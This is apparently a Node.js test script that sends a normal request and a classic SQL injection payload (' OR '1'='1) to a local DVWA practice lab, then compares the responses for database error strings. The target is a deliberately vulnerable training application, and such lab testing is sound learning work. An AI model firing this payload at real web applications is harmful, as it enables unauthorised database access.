const axios = require('axios');

async function testResponses() {
  const cookies = 'PHPSESSID=lforop4bmja8onpsut6kjk8655; security=low';
  const baseUrl = 'http://localhost:8080/vulnerabilities/sqli/';
  
  console.log('Testing DVWA SQLi responses...\n');
  
  // 1. Baseline (normal input)
  console.log('1. BASELINE REQUEST (id=1):');
  const baseline = await axios.get(baseUrl, {
    params: { id: '1', Submit: 'Submit' },
    headers: { Cookie: cookies },
    validateStatus: () => true
  });
  console.log('Status:', baseline.status);
  console.log('Contains "SQL syntax":', baseline.data.includes('SQL syntax'));
  console.log('Contains "mysql":', baseline.data.toLowerCase().includes('mysql'));
  console.log('Response snippet:', baseline.data.substring(0, 500), '\n');
  
  // 2. SQL Injection payload
  console.log('2. SQLI PAYLOAD (id=\' OR \'1\'=\'1):');
  const sqli = await axios.get(baseUrl, {
    params: { id: "' OR '1'='1", Submit: 'Submit' },
    headers: { Cookie: cookies },
    validateStatus: () => true
  });
  console.log('Status:', sqli.status);
  console.log('Contains "SQL syntax":', sqli.data.includes('SQL syntax'));
  console.log('Contains "mysql":', sqli.data.toLowerCase().includes('mysql'));
  console.log('Response snippet:', sqli.data.substring(0, 500), '\n');
  
  // 3. Check difference
  console.log('3. DIFFERENCE ANALYSIS:');
  console.log('Baseline has SQL error:', baseline.data.toLowerCase().includes('sql'));
  console.log('Payload has SQL error:', sqli.data.toLowerCase().includes('sql'));
  console.log('Are they different?:', baseline.data !== sqli.data);
}

testResponses().catch(err => console.error('Error:', err.message));
